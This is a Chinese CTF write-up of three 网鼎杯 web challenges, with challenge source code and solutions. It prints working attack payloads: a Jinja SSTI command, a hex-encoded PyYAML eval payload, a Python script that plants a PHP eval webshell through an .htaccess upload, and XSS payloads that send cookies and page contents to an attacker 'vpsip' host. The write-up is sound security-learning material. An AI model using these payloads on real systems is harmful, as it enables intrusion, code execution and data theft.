# 网鼎杯 WEB



感觉就打的很无语，特别无语，以为能学到什么东西，结果都是纯代码题（还是说没注意弄得非预期？）



## web669

```python
import os
import re
import yaml
import time
import socket
import subprocess
from hashlib import md5
from flask import Flask, render_template, make_response, send_file, request, redirect, session

app = Flask(__name__)
app.config['SECRET_KEY'] = socket.gethostname()
print(app.config['SECRET_KEY'])

def response(content, status):
    resp = make_response(content, status)
    return resp


@app.before_request
def is_login():
    print(app.config['SECRET_KEY'])
    if request.path == "/upload":
        if session.get('user') != "Guest":
            return f"<script>alert('Access Denied');window.location.href='/'</script>"
        else:
            return None


@app.route('/', methods=['GET'])
def main():
    if not session.get('user'):
        session['user'] = 'Guest'
    try:
        return render_template('index.html')
    except:
        return response("Not Found.", 404)
    finally:
        try:
            updir = 'static/uploads/' + md5(request.remote_addr.encode()).hexdigest()
            if not session.get('updir'):
                session['updir'] = updir
            if not os.path.exists(updir):
                os.makedirs(updir)
        except:
            return response('Internal Server Error.', 500)


@app.route('/<path:file>', methods=['GET'])
def download(file):
    if session.get('updir'):
        basedir = session.get('updir')
        try:
            path = os.path.join(basedir, file).replace('../', '')
            print(path,"CNM")
            if os.path.isfile(path):
                return send_file(path)
            else:
                return response("Not Found.", 404)
        except:
            return response("Failed.", 500)


@app.route('/upload', methods=['GET', 'POST'])
def upload():

    if request.method == 'GET':
        return redirect('/')

    if request.method == 'POST':
        uploadFile = request.files['file']
        filename = request.files['file'].filename

        if re.search(r"\.\.|/", filename, re.M|re.I) != None:
            return "<script>alert('Hacker!');window.location.href='/upload'</script>"

        filepath = f"{session.get('updir')}/{md5(filename.encode()).hexdigest()}.rar"
        if os.path.exists(filepath):
            return f"<script>alert('The {filename} file has been uploaded');window.location.href='/display?file={filename}'</script>"
        else:
            uploadFile.save(filepath)
        
        extractdir = f"{session.get('updir')}/{filename.split('.')[0]}"
        if not os.path.exists(extractdir):
            os.makedirs(extractdir)

        pStatus = subprocess.Popen(["/usr/bin/unrar", "x", "-o+", filepath, extractdir])
        t_beginning = time.time()  
        seconds_passed = 0
        timeout=60
        while True:  
            if pStatus.poll() is not None:  
                break  
            seconds_passed = time.time() - t_beginning  
            if timeout and seconds_passed > timeout:  
                pStatus.terminate()  
                raise TimeoutError(cmd, timeout)
            time.sleep(0.1)

        rarDatas = {'filename': filename, 'dirs': [], 'files': []}
        
        for dirpath, dirnames, filenames in os.walk(extractdir):
            relative_dirpath = dirpath.split(extractdir)[-1]
            rarDatas['dirs'].append(relative_dirpath)
            for file in filenames:
                rarDatas['files'].append(os.path.join(relative_dirpath, file).split('./')[-1])

        with open(f'fileinfo/{md5(filename.encode()).hexdigest()}.yaml', 'w') as f:
            f.write(yaml.dump(rarDatas))

        return redirect(f'/display?file={filename}')


@app.route('/display', methods=['GET'])
def display():

    filename = request.args.get('file')
    if not filename:
        return response("Not Found.", 404)

    if os.path.exists(f'fileinfo/{md5(filename.encode()).hexdigest()}.yaml'):
        with open(f'fileinfo/{md5(filename.encode()).hexdigest()}.yaml', 'r') as f:
            yamlDatas = f.read()
            if not re.search(r"woshishabi", yamlDatas, re.M|re.I):
                rarDatas = yaml.load(yamlDatas.strip().strip(b'\x00'.decode()))
                if rarDatas:
                    return render_template('result.html', filename=filename, path=filename.split('.')[0], files=rarDatas['files'])
                else:
                    return response('Internal Server Error.', 500)
            else:
                return response('Forbidden.', 403)
    else:
        return response("Not Found.", 404)

# python3 flask_session_cookie_manager3.py encode -s 'localhost' -t '{"updir": "static/uploads/4b3cf1ffc9224f4d830c5a29db854d15","user": "Administrator"}'
# eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw
# // eyJ1cGRpciI6InN0YXRpYy91cGxvYWRzLzRiM2NmMWZmYzkyMjRmNGQ4MzBjNWEyOWRiODU0ZDE1IiwidXNlciI6Ikd1ZXN0In0.YwgcYg.UOduF8D2iPx4zWCHrlVWxlSVgjM
# {"updir": "static/uploads/4b3cf1ffc9224f4d830c5a29db854d15","user": "Guest"}

# python3 flask_session_cookie_manager3.py decode -c 'eyJ1cGRpciI6InN0YXRpYy91cGxvYWRzLzRiM2NmMWZmYzkyMjRmNGQ4MzBjNWEyOWRiODU0ZDE1IiwidXNlciI6Ikd1ZXN0In0.YwgcYg.UOduF8D2iPx4zWCHrlVWxlSVgjM' -s 'localhost.localdomain'
# {u'username': 'admin', u'number': '326410031505'}
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888)
```

这个题目，session伪造读/etc/hosts就没啥好说的，比赛的时候发现updir能控制，所以直接穿了一个index.html上去覆盖就能通了

```
{%for(x)in().__class__.__base__.__subclasses__()%}{%if'war'in(x).__name__ %}{{x()._module.__builtins__['__import__']('os').popen('dd if=/flag').read()}}{%endif%}{%endfor%}
```

这里原本想写request.get 来任意执行代码的，结果不知道为什么比赛的时候就死活覆盖不上，而且很恶心的是只能试一次，不然就要重启靶机

提权这个https://gtfobins.github.io/gtfobins/dd/#file-read 直接打就有了

预期解是用yaml来做，不过方法大同小异，就是穿yaml覆盖，对yaml的过滤基本都没啥用，网上现成的payload八进制就能绕过了。

```
!!python/object/new:eval ["\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x77\x68\x6f\x61\x6d\x69\x27\x29"]
```

其他两题都没心情看了



## web923

git泄露拿到源码。这题是我最最最最最几把无语的

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        return '<form method="post" enctype="multipart/form-data" action='.url('index/index/upload').'>
            <input type="file" name="hw_file">
            <input type="submit" value="上传">';

    }

    public function dd(){
        return "cnm";
    }

    public function upload()
    {
        if (request()->isPost()){
            $file = $_FILES['hw_file']??'';
//            d(1);
            if(!$file){
                return json(['code'=>0,'msg'=>'请选择文件']);
            }
            $file_name = $file['name'];
            $file_tmp = $file['tmp_name'];
            $file_size = $file['size'];
            if ($file_size > 1024*1024*2){
                return json(['code'=>0,'msg'=>'文件大小不能超过2M']);
            }
            $file_error = $file['error'];
            if ($file_error > 0){
                return json(['code'=>0,'msg'=>'上传失败']);
            }
            $file_type = $file['type'];
            var_dump($file_type);
            $file_ext = explode('.',$file_name);
            $file_ext = strtolower(end($file_ext));
            if(strstr($file_type, "image/")){
                if($this->upload_as_image($file_ext, $file_tmp, "../uploads/images/".date('YmdHis')."/", ["gif"], request()->get("hw_file_name")??FALSE)){
                    return json(['code'=>1,'msg'=>'上传成功']);
                } else {
                    return json(['code'=>0,'msg'=>'上传失败']);
                }
            } else {

                if($this->upload_as_text($file_ext, $file_tmp, "../uploads/files/".date('YmdHis')."/", request()->get("hw_file_name")??FALSE)){
                    return json(['code'=>1,'msg'=>'上传成功']);
                } else {
                    return json(['code'=>0,'msg'=>'上传失败']);
                }
            }
        } else {
            return json(['code'=>0,'msg'=>'请求方式错误']);
        } 
    }

    public function upload_as_image($image_type, $image_tmp_file, $upload_base_dir, $file_ext_black_list, $image_filename=FALSE)
    {
        if(in_array($image_type, $file_ext_black_list)){
            return 0;
        }
        switch ($image_type) {
            case 'jpg':
                $image_ext = '.jpg';
                break;
            case 'png':
                $image_ext = '.png';
                break;
            case 'gif':
                $image_ext = '.gif';
                break;
            default:
                $image_ext = '.jpg';
                break;
        }
        $image_size = getimagesize($image_tmp_file);
        $image_width = $image_size[0];
        $image_height = $image_size[1];
        if($image_width > 200 || $image_height > 200){
            return 0;
        }
        if ($image_filename === FALSE) {
            $image_filename = date('YmdHis') . rand(1000, 9999) . $image_ext;
        } else {
            $image_filename = $image_filename . $image_ext;
        }
        if(!file_exists($upload_base_dir)){
            mkdir($upload_base_dir, 0777, true);
        }
        $image_file_path = $upload_base_dir . $image_filename;
        rename($image_tmp_file, $image_file_path);
        return 1;
    }

    public function upload_as_text($text_type, $text_tmp_file, $upload_base_dir, $text_filename=FALSE)
    {
        if(strstr($text_type, "ph")  || in_array($text_type, ['php', 'html', 'js', 'css', 'sql', 'phtml', 'shtml', 'php5', 'php7', 'phtm', 'pht', 'php8', 'php4', '.htaccess', 'tpl'])){
            return 0;
        }
        if (strstr($text_filename, ".") || strstr($text_filename, "/")) {
            return 0;
        }
        if( strlen($text_type) == 0){
            $text_ext = "";
        } else {
            if(!ctype_alpha($text_type)){
                return 0;
            }
            $text_ext = "." . $text_type;
        }
        if ($text_filename === FALSE) {
            $text_filename = date('YmdHis') . rand(1000, 9999) . $text_ext;
        } else {
            $text_filename = $text_filename . $text_ext;
        }
        if(strlen($text_filename) == 0 || strstr($text_filename, "/") ||!preg_match('/[A-Za-z0-9_]/is', $text_filename)){
            return 0;
        }
        if(!file_exists($upload_base_dir)){
            mkdir($upload_base_dir, 0777, true);
        }
        $text_file_path = $upload_base_dir . "/" . $text_filename;
        rename($text_tmp_file, $text_file_path);
        return 1;
    }
    
}

```



think的站。先说解法，这里的过滤是对后缀进行判断。但是.htaccess的后缀是htaccess所以完全没用，文件名可以通过hw_file_name控制。那么构造这么一个exp：

```python
'''
Author: Aaisui
Date: 2022-08-27 13:10:43
LastEditTime: 2022-08-27 13:21:50
Description: In User Settings Edit
FilePath: \wangding\cnm.py
'''

import requests,time


while True:

    files1 = {"hw_file":('shana.jpg',"<?php eval($_POST[0]) ?>")}


    url1 = "http://eci-2zeh8hn89fu5bzpqxuiw.cloudeci1.ichunqiu.com/public/?s=index/index/upload&hw_file_name=shana"

    res = requests.post(url1,files=files1)
    print(res.text)

    url2 = "http://eci-2zeh8hn89fu5bzpqxuiw.cloudeci1.ichunqiu.com/public/?s=index/index/upload&hw_file_name="
    files2 =  {"hw_file":('.htaccess',"AddType application/x-httpd-php .jpg")}
    res = requests.post(url2,files=files2)
    print(res.text)
    time.sleep(0.5)
```



写进去了直接/readflag就好



## web362

有bot不是xss就是xsleak，/report路由有xss点，先看看cookie

```
 <img/src=x onerror="a='http://vpsip:port/?s='+document.cookie;new Image().src=a">
```



可以看到hint 和referer，hint=Visit /g3t_fl4g to get flag，那思路就简单了，让bot访问/g3t_fl4g，然后将结果发出来就行了，利用fetch



```
<script>fetch('/g3t_fl4g').then(d=>d.text()).then(t=>{fetch('//vpsip:port', {method:'post', body:JSON.stringify(t), mode:'no-cors'})})</script>
```





还有个PHP的太简单了就懒得说了